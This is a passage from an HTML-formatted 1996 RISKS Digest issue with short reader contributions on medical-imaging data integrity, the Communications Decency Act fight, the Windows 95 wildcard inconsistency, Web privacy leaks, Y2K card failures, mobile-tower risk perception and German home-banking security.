definition, these lists will contain a large percentage of people with
emotional/mental problems. Is this a risk?  If so, what is the solution?

Jay Brown points out that
<P>
&gt; One potential risk with this type of system would be the "configuration<BR>

<P>
I would point out that this isn't too much of a risk.  This is a classic
database problem, and providers of these services are for the most part
using commercial RDBMS solutions, including those of my employer, to
overcome these sorts of risks.
<P>
I would have actually seen this as _reducing_ the risk of misidentification
of the information, as opposed to an increase.  It is rather hard to drop a
video tape or CD ROM and have the pictures spill out on the floor, after
all.  Having worked many years in a hospital, I can ASSURE you that this is
not currently the case.

<P>
As a software developer at a company which makes filmless medical imaging
systems, I can say that this risk is well understood and has been dealt with
by a variety of vendors for quite a number of years.  In fact, the news item
which prompted Mr. Brown's article describes deployment of a system which is
not terribly new or revolutionary with the exception that it deals with the
bandwidth-hungry full-motion cardiac video.  Our company, for example, has
customers have been operating completely filmless for over four years.
<P>
In addition to strong database integrity measures and a robust
fault-tolerant message model, we, like most PACS (Picture Archiving and
Communications Systems) vendors, take great pains to embed patient and exam
identifying information into each series of images in *addition* to the
information stored in the indexing database.  In the event of some sort of
horrible disaster, a known good back-up the database can be loaded in place
of a damaged one and then the more recent information determined by a walk
of the on-line and (if necessary) off-line archives.
<P>
Furthermore, the new DICOM (DIgital Communications in Medicine) standard
which is used by different vendors to network their systems in fact this
makes required in the header for each image itself.  The overhead required
to do this is minimal relative to the size of each medical image (range 256
x 256 8-bit grayscale, through 640 x 484 24-bit color, to 2K x 2K 16-bit
grayscale) and the fact that lossy image compression algorithms generally
can't be used if the image is to remain diagnostic quality.
<P>
The risk of the wrong images being associated with a patient actually
predates computerization of radiology.  Given the sheer number of sheets of
film generated each day at a radiology department and the resulting
likelihood of the sheets going astray, most modalities long ago adopted the
practice of burning the name and identification of the patient *visibly*
into each image itself.  I expect this practice to continue in the digital
age.  Thus there is an immediately visible human check on the operation of
any computerized system in addition to "Why does Mr. Johnson have a uterus?".
<P>
All in all, I would say that there is more of a risk of being wheeled into
the wrong operating room than having a radiologist accidentally diagnose
your case from someone else's images.

</ADDRESS>
[Postscript added later by Allan:]
<P>
While the original proposed risk (i.e., the wrong images being associated
with a patient) is quite low (as discussed in my previous missive), there is
another slightly different risk which is more likely and has just a large
potential for harmful results to the patient.  The risk is that when a
radiologist is looking at digitally transferred images of a patient's exam,
can he or she be absolutely sure that *all* of the images captured are
actually being shown?  A fairly serious medical condition can often be
evidenced in only a single image from a large set, and thus omission of one
or more images runs the risk of a misdiagnosis (eg. a false negative).
<P>
The basic network dependability problem is complicated by the possible
presence of WANs (eg. we have a number of sites where outlying clinics feed
images to expert radiologists at a central institution).  These
lower-bandwidth conduits can introduce significant lags in the transfer of
large images.  Unexpected communications difficulties (eg. momentary Telco
line outage) may occasionally increase these lags without the knowledge of
the users of the system.
<P>
My company's system contains extensive interprocess status messages and
sanity checks to ensure that this risk is virtually eliminated.  However
this only works when our system handles both the capturing and viewing of
the images at either end of the network as the protocols are a careful
proprietary design developed over the years.  With the wide-spread adoption
of DICOM as the lingua franca by which different vender's medical imaging
equipment uses to talk amongst themselves we are seeing heterogeneous
deployment of components in imaging networks.  Unfortunately the DICOM
standard has, up to now, avoided a lot of the hard issues involved in
handling this risk.  Recent proposed additions to the standard address the
problem somewhat, but these would be optional for vendors to implement.
Thus there is always the risk of a minimalist DICOM implementation breaking
end-to-end robustness of more complete systems with which they are
interacting.

<P>
I suppose it is worth repeating the obvious risks of life from time to time,
but after a while, that approach turns RISKS into a pretty monotonous,
boring, and ultimately worthless publication.
<P>
The precise same risk for electronically stored and transmitted medical
images could just as easily be applied to any type of information storage on
any type of media.  Consider a slight rewording of the last sentence quoted
above:
As any secretary knows, keeping track of a lot of different
files in a filing cabinet, many of which have more than one
version, is not a trivial task.

Or take it back to the first cave dweller who tried to keep track of
his kids on stone tablets:

<P>
Too often, I think one of the risks of RISKS is that too many people try too
hard to find risks in every little thing.  Perhaps you (the moderator) and I
disagree on what risks are worth mentioning, but it seems that you usually
keep things on the interesting side.  Not this time.

Or maybe I'm just grumpy because I've been working too many weekends lately.

<P>
The CDA: Has It Fallen? Can It Get Up?   - Stanton McCandlish, <A HREF="mailto:mech@eff.org">mech@eff.org</A>
<P>
In the days after the passage of the unconstitutional "Communications
Decency Act" as part of the Telecom bill, the CDA appears to be toppling
just as it should have begun to ride high in the saddle of fundamentalist
"victory" (though the battles are hardly over yet.)
<P>
The entire Congress passed this bill (some Members knowing it was
unconstitutional, and some on the other extreme not even knowing the CDA
existed), with the exception of the following legislators who voted against
the whole Telecom Bill:
<P>
Representatives
<P>
Earl Hilliard (D-AL), Pete Stark (D-CA), Pat Schroeder (D-CO), Neil
Abercrombie (D-HI), Lane Evans (D-IL), Sidney Yates (D-IL), Barney Frank
(D-MA), John Conyers (D-MI), Collin Peterson (D-MN), Harold Volkmer (D-MO),
Pat Williams (D-MT), Maurice Hinchey (D-NY), Jerrold Nadler (D-NY), Peter
DeFazio (D-OR), Timothy Johnson (D-SD), Bernard Sanders (independent-VT)
<P>
Senators
<P>
Dianne Feinstein (D-CA), Patrick Leahy (D-VT), Paul Simon (D-IL), Paul
Wellstone (D-WI), and John McCain (R-AZ).
<P>
(Plus a handful that did not vote.)  In all, only a single Republican, out
of both Houses of Congress, voted to preserve American freedom of
expression.[*]
<P>
The President proclaimed, in the first State of the Union Address to mention
the Internet, "When parents control what their children see, that's not
censorship. That's enabling parents to assume more responsibility for their
children. And I urge them to do it". Clinton then, in a signing party timed
to coincide with the press attention given to the "24 Hours In Cyberspace"
multimedia event, enacted a law that strips parents of the right and
responsibility to decide what is appropriate for their own children.  The
CDA would not only fail to help "parents control what their children see" -
a goal long supported by EFF, ACLU, VTW, CDT and others opposed to the
"decency" bill - but actually hinder the development of tools and services
to help parents and teachers filter children's Net access.
<P>
* Backlash
<P>
It is ironic that it took passage of this law to garner the public and media
attention it warrants.
<P>
For 48 hours after President Clinton's signing of the CDA into law,
thousands of Web users and BBS sysops world wide took part in a "Thousand
Points of Darkness" protest of the new censorship law by turning their Web
page and login screen backgrounds to black, to mourn the death of the
Internet as we know it.  Some, including online magazines such as Factsheet
Five Electric and Scamizdat, blanked out their entire online offerings,
replacing everything that had been available with a single sentence: "This
is what censorship looks like".
<P>
The protest garnered major news coverage of the Net censorship debate for
the first time.  Finally the debate has shifted from false "save the
children" hype to the real issue: free speech, press and association rights
in new media.  The "facts", figures and motives of the lobbyists and
lawmakers behind the CDA are at last being more widely examined.
<P>
The "black page" protest is being followed up with a long term
awareness-raising and protest effort, in which participants, already
numbering in the tens of thousands, wear blue ribbons, and place graphics of
blue ribbons on their online services and homepages.  Participants range
from individual users, to online journalism sites like HotWired, to major
centers of Internet connectivity like Netcom and Yahoo!, among others.
<P>
As with Germany and France, where attempted censorship of online information
has backfired, leading to proscribed data's immediate global availability
from numerous anti-censorship "mirror sites", the U.S.  government may have
to learn the hard way. The online community is determined to knock the
lesson into regulators' heads.  To cater to censored U.S. users, "offshore"
anonymous Internet access providers are popping up, such as Offshore
Information Services Ltd - <A HREF="http://online.offshore.com.ai/">http://online.offshore.com.ai/</A> - offering
$50/month privacy-protected accounts from tax-haven island Anguilla.
<P>
In case that were not enough, an ad-hoc programmer coalition, the Decense
Project - at <A HREF="http://www.clark.net/pub/rjc/decense.html">http://www.clark.net/pub/rjc/decense.html</A> - has produced an
"de-censoring" solution, which like that of the Anguilla ISP, also provides
privacy protection as a bonus: Decense, "a cgi script designed to
provide a double-blind pseudonym scheme which allows a site to hide
behind a chain of http servers which 'proxy' for it. Neither the user [ID]
requesting the document, nor the ultimate address of the destination web
site is immediately available to prying government eyes."
<P>
* Action in Court and Congress
<P>
The action has spread offline as well. There has already been an public
protest rally in Washington DC on Feb. 10, and there are others in the
works.  The University of Pennsylvania at Philadelphia will see a
demonstration just before a scheduled speech by VP Gore.  A DC "Electronic
Freedom March" is gearing up, and even high school students are donning blue
ribbons and demonstrating against reactive academic censorship
<P>
Most importantly, the new law itself is under concerted attack in
the courts and on the Hill.
<P>
EFF, with ACLU and 24 other organizations, have filed a federal lawsuit
against the Department of Justice (DoJ), in the Philadelphia court of Judge
Ronald Buckwalter, challenging the CDA on constitutional grounds. As of Feb.
13, Judge Buckwalter has not only commended the plaintiffs on a well-<BR>
written lawsuit, but has put the case on the fast track, demanding a DoJ
response by Wed. Feb. 14. The Judge further indicated that he will likely
grant plaintiffs' motion for a temporary restraining order (TRO), by Thu.,
Feb. 15 at the latest, without further hearings.  The TRO would prevent
enforcement of the CDA pending a hearing before and decision from a panel of
three judges, on a motion for a longer-term preliminary injunction that
would prevent all enforcement of the "decency" provisions until the real meat
of the case is settled - whether the CDA stands up to constitutional
challenges.  The hearing on the long-term injunction should take place
within the next few weeks.  And the balance of the legal "tests" the CDA
must face are very much in plaintiffs' favor.
<P>
Though the DoJ has agreed to make no arrests under the new statutes between
now and the probable issuance of a TRO this week, content and access
providers should be warned that the FBI and other Justice Dept. agents may
later decide to prosecute for CDA violations committed during this time, if
they eventually win the case - a possibility everyone should be concerned
about.  And plaintiffs' attorneys warn that even the little assurance
provided by DoJ for now is rather meaningless since it has not been put in
writing.
<P>
The Justice Dept. and the Christian Coalition are expected to present, as
evidence supporting the CDA, the most vulgar content they can possibly find
online - though this tactic could backfire.  After all, the CDA does not
address pornography (obscenity) at all, since it is already illegal online
or offline, but rather targets indecency, a broader category including
nudity in almost any context, or "indecent" words like those found in any
PG-rated movie.
<P>
In the meantime, the Telecom bill has been delivered a one-two-punch by
some of the legislators that voted against it the first time around.  Sen.
Patrick Leahy (D-VT), like Rep. Jerrold Nadler (D-NY), was a high-profile
participant in the WWW Blackout protest, and has, with Sen. Russ Feingold,
introduced a new bill (S.1567) to repeal most of the CDA. This legislation
will likely need to be re-examined and modified to make sure it actually
succeeds in the goal of removing the threat posed by the Communications
Decency Act.
<P>
* Women's Groups and Others Join the Battle
<P>
Rep. Pat Schroeder (D-CO) is attacking another dangerous provision of
the Telecom Bill - an amendment outlawing the online distribution of
certain kinds of abortion-related information. The amendment in question
was slipped into the leviathan telecommuncations "deregulation" package
by Rep. Henry Hyde (R-IL), who also shepherded the final version of the CDA.
<P>
Schroeder announced that she will introduce a bill, when Congress
re-convenes on Feb. 26, to repeal this less well-known Telecom Bill
assault on free expression. (It should be noted that although Rep.
Shroeder voted against the Telecom bill in the final vote, she can be
partially blamed for the existence of the CDA in that bill - she voted
"yes" on it in committee deliberations, along with a majority of her
colleagues.)
<P>
The "abortion gag rule" in the Telecom bill is also being slammed in in
another lawsuit, Sanger v. Reno, filed in New York by the Center for
Reproductive Law and Policy, and many other plaintiffs.  In this case, U.S.
Attorney Zachary Carter has (according to ACLU releases) admitted the
unconstitutionality of the CDA, and also agreed to hold off enforcing it for
a while. East District of New York Chief Judge Charles P. Sifton has asked
Chief Judge Jon O. Newman of the U.S. Court of Appeals for the 2nd Circuit
to convene another 3-judge panel to decide this case.
<P>
Sifton has not granted a TRO or injunction. The Judge appears to find the
DoJ's assurances sufficient evidence that this particular provision will not
be enforced or chill free speech. His decision may also rely on the fact
that the section of the ancient Comstock censorship law modified by the
Telecom Bill to ban abortion info online, has not been enforced in many
years.  However, no court has yet to rule the Comstock Act unconstitutional,
leaving some people worried for the short term, even if they expect an
eventual favorable decision from the 3-judge appellate court.  Content
providers and internet users, as well as women's groups, are also not
particularly comforted by the platitudes of supporters of the abortion info
ban, who have disingenuously claimed they simply want to update the Comstock
law for consistency reasons and to show support for "Christian" ideals, but
don't expect anyone to actually be censored under the new revisions.
<P>
Plaintiffs' attorney Simon Heller said, "We are extremely pleased that the
Clinton Administration has recognized the invalidity of this law.  However,
we believe a court ruling against the provision barring receipt or provision
of abortion information is still necessary to prevent a future
administration or radical right-wing members of Congress from wielding it
against women's health care providers and advocates."
<P>
* Shifting Lines
<P>
It is clear that the Internet and computer industries do not support the
Communications Decency Act, though most organizations in these fields did
not act, other than to support EFF and other advocacy groups, until too
late.  It has shocked the commercial world as well as the general public
that Congress would actually pass a bill so terrible.  The industry is,
however, increasingly participating in protest, and legal, action against
the CDA, realizing that such important decisions as what we each should read
or avoid cannot be left up to government.  Even the usually Beltway-shy
Microsoft is taking a stand; in an AP interview, the company's leader, Bill
Gates, said of the Internet regulation attempt, "Unfortunately, it means
we're going to have to spend some time in Washington, DC. In the first 15
years of Microsoft history, we never visited Washington."
<P>
And content producers of all sorts are expressing concern, even outrage,
from upstart multimedia giants, to major print publishers, all of whom now
find not only their free press rights but also their livelihoods threatened.
As journalism organizations have flocked to the pro-speech side, only one
news association, to our knowledge, has offered anything but derision for
the CDA. (Newspaper Association of America President John Sturm expressed
support for the telecom bill as a whole, citing only disappointment at the
censorship, and support of the "motives of the conferees to protect children
from obscene and indecent material".  One wonders how closely Mr. Sturm has
questioned those motives.)
<P>
It is clear that the fundamentalist organizations and legislators behind the
CDA have neither an understanding of the medium and issue, nor any
particular desire to inform the public or the media. The Family Research
Council - <A HREF="http://www.frc.org">http://www.frc.org</A> - disinformed readers by quoting and explaining
in their newsletter the obscenity restrictions from an older draft of the
bill (which they helped replace with an unconstitutional "indecency"
version) in an attempt to imply that the FRC and their favorite bill would
prohibit online distribution of obscenity.
<P>
Religious right spokespersons, as well as CDA sponsors like Exon and Hyde,
repeatedly tell the press and tv news programs that they are trying to
"protect children from pornography" as if somehow unaware that their bill
actually makes it more difficult to prevent children from being exposed to
inappropriate materials, by removing all incentive to continue developing
services and software which genuinely perform this needed function.
<P>
But perhaps even the moralists are having second thoughts (or trying to save
face): Confronted with World Wide Web co-creator Tim Berners-Lee's free Net
filtration software, Christian Coalition spokesperson Heidi Strup conceded
that the program "definitely would be a useful tool for us."  One must
wonder how and why the CC and its allies failed to realize this 6 months
ago.
<P>
More education and outreach is clearly needed, so that legislators do not
fear the net, so that lobbyist groups do not push for unneeded and hazardous
legislation, and most importantly so that the general public have a better
understanding of their free speech rights and recognize the early warning
signs of censorship threats.
<P>
On the other side of the issue, organizations like Voters' Telecom Watch
(<A HREF="http://www.vtw.org">http://www.vtw.org</A>), with help from local activists (see, for example the
"Tennessee Hit List" of bad legislators at
<A HREF="http://www.people.memphis.edu/~mddallara/hitlist.html">http://www.people.memphis.edu/~mddallara/hitlist.html</A>) vow to bring the Net
constituency into its own in upcoming elections.  They are gearing up to
vote out legislators and other officials at all levels who betray the trust
of their voters by pushing for censorship.  The online voting bloc will have
a number of people to remove from office, it seems, given Congresspersons
like Rep. Thomas Bliley (R-VA), chair of the House Telecom Committee, who
seems to consider the CDA's assault on the Constitution an inconsequential
matter to be fixed by "technical corrections" to the bill later in the year.
And what about Vice-President Al Gore? For all his "Information
Superhighway" hype, Gore strongly supported passage of the legislation,
since, after all, the courts can take care of the unconstitutional stuff.
Sen. Carl Levin (D-MI) echoed both sentiments, at an "ask the politicians"
event in Kalamazoo, MI, claiming that the CDA was only "one small page in a
very large bill", and stating that he knew it was unconstitutional and (you
won't believe this) that it is "always necessary to test the
Constitutionality of some legislation", ergo no service providers would get
hurt!  Perhaps Sen. Levin considers this a game, but online voters may just
cure him of that notion come election day.  And let's not forget legislators
from Connecticut and other states, who did not even know the CDA was in the
Telecom Bill - they passed it without reading the bill at all, much less
understanding it's impact.
<P>
* Civil Disobedience (and Decidedly Uncivil Obedience)
<P>
At present EFF cannot advise what to do and not do under the CDA.
No one can.  The law is too vague and overbroad to be applied meaningfully.
<P>
Some sites are already closing, with more providers broadly self-censoring
their content.  The moderator of an amateur radio discussion group closed
the forum down, saying only, "I have closed my mailing lists to minors, not
in protest but for my own protection. Since I enforce rules of conduct for
the lists, I think I'm too close to being part of content creation to be
safe should one of the subscribers post a 4-letter word."  If the judges in
the cases challenging the CDA need any evidence of the chilling effect of
this legislation, this should be all they need.
<P>
Other content providers, including many who had never thought of posting
"offensive" materials at all, are engaging is widespread civil disobedience,
deliberately violating the new Act. A particularly creative example can be
found at <A HREF="http://coolheart.infi.net/exon/index.html">http://coolheart.infi.net/exon/index.html</A> - you can send a
Valentine'd Day card to Sen. Exon, reading "In honor of Valentine's Day, I
thought I would send you an example of some of the nudity I've found on the
Internet - Enjoy", and including your choice of several classic works of
art, including Michelangelo's "David" and Boticelli's "Birth of Venus".
<P>
Yet more are being "uncivilly obedient", complying - barely - by
ROT13-encrypting "dirty words", putting "CENSORED!" banners all over their
web pages, replacing scatological terms with legislators' surnames, and
other actions of visible obedience-under-duress.
<P>
Still, helpful as these actions may - or may not - prove to be, some protest
activities are decidedly unhelpful.  "Spamming" Senate and House email
addresses, particularly with indecent material is self-defeating.  Please
remember that this legislation passed because legislators by and large were
too ignorant of the medium to recognize that the Net is not really a den of
pornographers and terrorists.  Irresponsible and overtly threatening
gestures - especially threat letters or dirty stories - will only prove to
legislators' minds that they were right after all.
<P>
Lastly, please keep in mind that obvious civil disobedience can be
dangerous, particularly as "Oklahomans for Children and Families" and other
local fundamentalist groups are on the prowl, vowing to report to police any
CDA violations they find. The current hold on enforcement of these laws by
the Justice Dept. does not even mean you can't be prosecuted for violations
occurring now (assuming the court cases fail, which is probably not a good
assumption, fortunately), only that you won't be prosecuted right now.

This book does cover, briefly but well, the concepts involved in preparing
digital money which is safe (for both customer and vendor) and private.  Some
additional time and space could have been given to the strengths and weaknesses
of encryption, even given the non-technical target audience.
<P>
There are a number of other topics which are related, but not really essential.
Much space is given to new forms of marketing, and even to a discussion (those
who know the history of this review series will note the irony) of copyright.
While these fields are interesting, they do detract from the central issue of
commercial information security in an open environment.

<P>
Mark Fisher suggests that running a secure OS (e.g., Windows NT) is a "real
solution" to these attacks.  I think this is misleading. The suggested
approach (an API call to retrieve a string not visible to keyboard
interceptors) is not qualitatively different from the notion of displaying a
calculator keypad and entering the number with mouse clicks.  Both
approaches make it necessary to target the attack more precisely, and
perhaps to use different means (such as grabbing the number from a memory
bufffer or a disk file), but don't materially improve the security of the
information.
<P>
A secure OS is no panacea, for all it can do is prevent the things it knows
about.  It can't stop a program that I run from accessing files to which I
have legitimate access.  It can't really even stop me from breaching the OS
security perimeter: after all, if one of that interminable series of
diskettes says "On Windows NT, log in as Administrator and run this SETUP
program to install an improved device driver", what can I do?  I can refuse,
but then I won't get whatever software I wanted.  I can't exactly examine
anything to see if it's "safe"; I can't even figure out what "safe" might
be.  In a personal desktop computer, the user is responsible for everything
that happens, and there is no "system administrator" to set the rules and to
decide what's safe and what isn't.  The PC environment poses fundamentally
different security problems from the ones we've spent 30 years figuring out
how to solve.

&gt; ... Sandman's seven characteristics that determine an issue's<BR>
&gt; "outrage valency" in a community.
<P>
Add another one:-
<P>
Immediate vs deferred risks: if something has an immediate effect,
it inspires more dread than something which takes a long time,
e.g., it is well known that smoking leads to fatal diseases, but
these usually manifest themselves only after many years of consumption.
<P>
&gt; Plane accidents are much rarer, cause fewer deaths, but because they<BR>
&gt; can cause large fatalities, air travel is much more widely feared<BR>
&gt; than car travel. [Perhaps this explains (in part) the number of<BR>
&gt; articles regarding air safety in comp.risks ;-) ]
<P>
As a captain is reported to have said over the PA after landing,
"Thank you for flying with us. The safest part of your journey is
now over."
<P>
A good way of saving weight would be to remove the life-jackets
from under the seats of the smoking section! :-)

Dave Shaw's summary of "outrage at the unknown," notes seven characteristics
that determine an issues "outrage valency" in a community. I should like to
add an additional characteristic that is implied, but not stated by Dave's
article: "Us vs. Them"
<P>
In the particular example, a new mobile phone transmission tower adjacent to
a school, all of the benefit of the transmission tower will go to people who
can afford a mobile phone, while all of the risks -- however miniscule --
will be borne by the children in the adjacent school. Since the children
derive no benefit from the tower, it is not unreasonable that their families
are unwilling to bear the medical risks, even if they are trivial.
<P>
This subject is also discussed in Charles Perrow's book, "Normal Accidents,"
which should be on every Risk reader's bookshelf.

&gt;Hence, if Telstra could have found a better way of measuring the<BR>
&gt;risk of their towers (i.e., the Radiation Laboratory and their<BR>
&gt;EMR meters), they may have avoided publicity like the angry
<P>
An interesting point, but the perception I think is not based on
distinctions like voluntary/involuntary, familiar/exotic risks, etc. but in
what many people view as a distinction between a "risk" and a "hazard".
Much literature on technology and society (Langdon Winner comes to mind)
discusses this distinction.
<P>
To call something a "risk" is to emphasize probability and chance while
minimizing the danger.  There are no value judgements in discussing risks:
losing change in a vending machine or getting cancer from a nearby toxic
waste dump can be both termed as a "risk".  The latter is viewed as a
"hazard" by most people, since the "risk" involves a person's health and
well-being.
<P>
Indeed, the "risk" of getting ill from a nearby tower may be incredibly
small, but it isn't nil either: would *you* want to be the one in a million
who catches cancer?
<P>
That some in government or a business would actually weigh the economic
costs of "health risks" versus the costs of avoiding them, and deciding a
lawsuit is cheaper to settle than to clean up a toxic waste site or move a
tower (or public perception that this is happening) can fuel public outrage.

Periodically I remind you of TWO useful digests related to privacy, both of
which are siphoning off some of the material that would otherwise appear in
RISKS, but which should be read by those of you vitally interested in
privacy problems.  RISKS will continue to carry general discussions in which
risks to privacy are a concern.
<P>
* The PRIVACY Forum is run by Lauren Weinstein.  He manages it as a rather<BR>
selectively moderated digest, somewhat akin to RISKS; it spans the full
range of both technological and non-technological privacy-related issues
(with an emphasis on the former).  For information regarding the PRIVACY
Forum, please send the exact line:

run by Leonard P. Levine.  It is gatewayed to the USENET newsgroup
comp.society.privacy.  It is a relatively open (i.e., less tightly moderated)
forum, and was established to provide a forum for discussion on the
effect of technology on privacy.  All too often technology is way ahead of
the law and society as it presents us with new devices and applications.

There is clearly much potential for overlap between the two digests,
although contributions tend not to appear in both places.  If you are very
short of time and can scan only one, you might want to try the former.  If
you are interested in ongoing discussions, try the latter.  Otherwise, it
may well be appropriate for you to read both, depending on the strength of
your interests and time available.

<P>
I just read something disturbing in PC Magazine, which I have verified is
true. In Windows 95, the "?" wildcard is treated inconsistently in file
specifications: sometimes it means "exactly one character", and other times
it means "at most one character".
<P>
Suppose you have a directory with two files in it, one named XX and one
named XXX. The command "DIR XX?" will only show the second file, but "DEL
XX?"  will delete both files!
<P>
One dependable rule in every computer system I have ever used prior to this,
is that a wildcard specification will always expand to the same set of
filenames, regardless of what command you use it in. Wind95 not only breaks
this rule, it breaks it in the worst way: the "delete" command, given the
same wildcard specification, will delete a larger set of files than the less
harmful "directory" command will display! This means you can no longer use
the technique of checking a wildcard specification with DIR to make sure it
will only affect the right files, before letting it loose with DEL.

Excerpted from a front page article of Feb. 5th, 1996 issue of Federal
Computer Week titled "Budget cuts, culture hurt NASA systems", article
written by Elizabeth Sikorovsky:
<P>
****snip*****<BR>
Hackers have already attached password sniffers to NASA systems and
used the space agency's computers to store and exchange stolen data
and software.  And there are fears that satellites could be "hijacked"
by hackers armed with nothing more than a PC and a ham radio.
<P>
This is not science fiction, NASA security inspectors insist.  No
attacks on satellites have been detected, but "the only reason it
hasn't happened is because hackers haven't thought about it yet,"
said [name deleted by the person submitting this to the RISKS forum,
out of kindness], a communications security specialist at NASA.<BR>
****snip****
<P>
Amazing.  I wonder how many people are out there, right now, trying to be
the first to drive a NASA satellite from home.  The biggest RISK will always
be people.  Unless of course, the folks at NASA just wanted to encourage
some independent 'assessments' of their satellite comms' security posture.

One Web-related risk that many folks seem oblivious to is the amount of
information that a Web server can receive when they retrieve a document: The
client host name, the referring URL, and personal identifying information
(if the client is running a finger or ident server.)
<P>
Furthermore, the Alta Vista server includes the search keywords in the URL
corresponding to the search results: I was initially alarmed when I saw a
referring URL on my server that had the keywords "explicit," "sex," and
"images."  It turned out that the Alta Vista webcrawler had indexed a
technical report that just happened to contain those three words.

I was recently watching my 11-year-old son play a computer racing game. His
car was invulnerable, and he crashed into other cars at every opportunity.
It occurred to me that enhancements of this might lead to this future risk:
<P>
A 15 year old is an expert player of a VR racing game (this is set about 5
years from now) that almost completely simulates reality - steering wheel,
pedals, eyes and ears with VR input, and more. In the game, you do better by
crashing into cars that cut you off.
<P>
At sixteen, our hero gets a driver's license. On the road, another driver
cuts him off. Using his finely tuned, VR trained reflexes, he immediately
crashes into the other car.
<P>
Is this risk plausible?
<P>
What other risks might there be from using reflexes developed in VR games in
real-life situations?

Here's an interesting twist - we purchased a new VCR recently, it has a
"feature" that will receive time signals "over the air".  The signals are
mostly broadcast on PBS channels.
<P>
The other night, we set the VCR up to record a program, as normal, and just
happened to be near the VCR at the time it should have come on - it didn't.
We recorded the program manually, and then went troubleshooting.  It turns
out that the date/time in the VCR had been set by a signal from KCTS
(Channel 9, here in Seattle) which had the correct TIME, but was off by a
full day!  When I called Channel 9, it took them 2 days to get back to me,
and the person who returned the call said "Thanks for letting us know - we
have no real monitors on that system, and it took a 'power hit' a few days
ago".

with the text: "Due to a software error this machine does not accept XX
cards with an expiration date after 1999". I happen to have an XX card which
was issued only two months or so ago. I took a quick look to see that it
expires in November 1999. The first cards expiring in January 2000 must just
have been issued...

My university uses phone registration with a PIN that depending on your
department and status is either assigned to you or is your birthdate.
Students can also access and change certain personal information online
using the same PIN. This Access program allows you to change your PIN as
well, so I did, since I was one of those with a birthdate PIN.
<P>
Unfortunately, these PINs are reset automatically and without notification!
I was unable to log in until, in desperation, I tried the old birthdate PIN.
Being a swamped graduate student, I let this happen 3 times before I found
someone to complain to. Here's the response I received:
<P>
&gt;     I was not aware that we were changing PINs back to dates, but it does<BR>
&gt;not surprise me.  The University is in the process of bringing up a new<BR>
&gt;version of Telephone Registration that will use a separate PIN for<BR>
&gt;advising functions, (Unfortunately, it will not be coming up as soon as we<BR>
&gt;would have liked.) At that time the Access PIN we use now will not be<BR>
&gt;continually reset.  Until then however, I guess we have to put up with it.
<P>
Besides the obvious risk of a malicious person dropping me from all my
classes, giving me late registration fees, or changing my address, I can now
worry about the risks of non-risk-sensitive people in high places.

In a recent RISKS article, <A HREF="mailto:simsong@vineyard.net">simsong@vineyard.net</A> recounted the tale of a
friend who had accidentally left a program running that looked like it was
attacking LANL over the network.  He told of LANLs rather aggressive
response, threating to sue both his friend and his friend's ISP, and
(apparently having received no response) ended up getting the ISP to shut
down the account.  His last paragraph:
<P>
&gt;This is really scary --- the thought that some government official can call<BR>
&gt;up your ISP and, through a combination of threats and legal citations, have<BR>
&gt;somebody's internet feed immediately terminated. What about due process of<BR>
&gt;law? What about innocent until proven guilty? What about having to go<BR>
&gt;through the mere formality of obtaining a court injunction before having<BR>
&gt;action such as this taken?
<P>
I read this with some amusement, reflecting that calling up a suspected
hacker's ISP (usually a university) has *always* been the fastest and
easiest way to deal with a threat.  Shutting down an account until you could
figure out what was going on was SOP.
<P>
Back in college I had my student account (mistakenly) shut down this way
once, and later as an system administrator I was involved in a number of
cases that started with a concerned phone call from a remote sysadmin.  When
people of talk of the internet being a cooperative effort, this implicit
responsibility taken by ISPs is the first thing that springs to my mind.
<P>
But there's an important wrinkle now -- to my knowledge no student has ever
sued a university over having a computer account shut down by accident
(though I did get a homework extension when it happened to me).  A lawsuit
against a commercial ISP is almost a certainty.
<P>
Obviously LANL knows this and went completely over the top in order to
secure the ISPs' cooperation.  In the process what used to be a respectful
exchange between sysadmins has been turned into a legal feeding frenzy.
<P>
Was LANL wrong to do this?  I don't know.  Commercial ISPs have been
increasingly strident in refusing to take responsibility for their users,
and may need prodding.  On the other hand, LANL could simply have stopped
accepting all traffic from that ISP and called it a day.  It would be
interesting to know their reasoning.
<P>
The only RISKs in this situation are ones we already know about.  Lawsuits
follow money, and money has found the internet.  Who can sue who, and for
how much, is still being worked out.

<P>
The "Us vs. Them" and the business of groups weighing the economic costs
of risks leads to the issue of not only how do people evaluate risks,
but how to groups evaluate risks.
<P>
Individuals have inherently different means of valuing things than
groups do, and this is only sound economic principles at work.  For
example, most individuals will expend virtually all their assets in
order to maintain their health and prolong their life.  (They tend to do
this more at the later stages than the earlier ones, based on the future
vs. immediate risks, as has been mentioned here.)  Yet while this makes
fine sense for an individual, it would be ludicrous to suggest that 100%
of the world's GDP should be spent on medicine and hospitals.
<P>
The community as a whole has to allocate both benefits and risks to the
individuals around, but allocating a risk or benefit isn't the same as
evaluating the worth of the individuals involved.
<P>
As previously noted, people downplay risks they understand, such as the
risk of being in a car accident.  Likewise they downplay the reduction
in such risks.  Having mobile phones means that the average response
time to many emergencies (car accidents, crimes, fires, etc) can be
reduced thanks to a person having a phone in their hand as the emergency
occurs.  (Of course this goes along with the added risk of a drive on a
mobil phone *causing* an accident!)
<P>
I don't want to be the one in a million that catches cancer, but neither
do I want to be the one in a million that needs emergency help when the
phone lines are down but a mobile phone would still be functioning....

<P>
Dave Shaw's comments are well taken, and the ideas have been around for some
time.
<P>
A particularly interesting formulation of the main ideas is expressed by
Martin and Schinzinger in their book, "Ethics in Engineering" (McGraw-Hill
1989).  They view engineering as a form of social experimentation.<BR>
Engineers do not have complete knowledge of the world and all its natural
and social laws, but go ahead with projects due to the perceived benefits.
Viewing engineering as an experiment on a societal scale puts the focus
where it "should be" - on the human beings affected by technology.
<P>
In an analogy with medical experimentation, the authors note that society
has recently come to recognize the primacy of the subject's safety and
freedom of choice as to whether to participate.  Informed consent is
considered an important moral and legal safeguard in this respect.  Informed
consent is seen as having two elements: (1) subjects must be given all the
information needed to make a reasonable decision, and (2) subjects must
enter into the experiment without being subjected to force, fraud, or
deception.
<P>
What is "sometimes overlooked" is "the common enough human readiness to
accept risks voluntarily undertaken (as in daring sports), even while
objecting to involuntary risks resulting from activities in which the
individual is neither a direct participant nor a decision maker.  In other
words, we all prefer to be the subjects of our own experiments rather than
those of somebody else."  (page 69)

Is the German Homebanking unsecure?
<P>
In his article Klaus Brunnstein "proved" that Homebanking in Germany is
unsecure.  But this is not true in practice!  I had the possibility to
correct this in an television interview this Monday in the same TV Magazine
in which Mr. Brunnstein gave his "proof" of NonSecurity last week.  Indeed
theoretically there are some possible attacks concerning PARTS of the
whole security system.  But a whole system is secure for the customer and
the bank if the sum of all necessary criminal acts that are necessary to
break the system do not destroy the interest of potential criminal hackers.
Our Homebanking-System is really very secure as the statistics show: Over 15
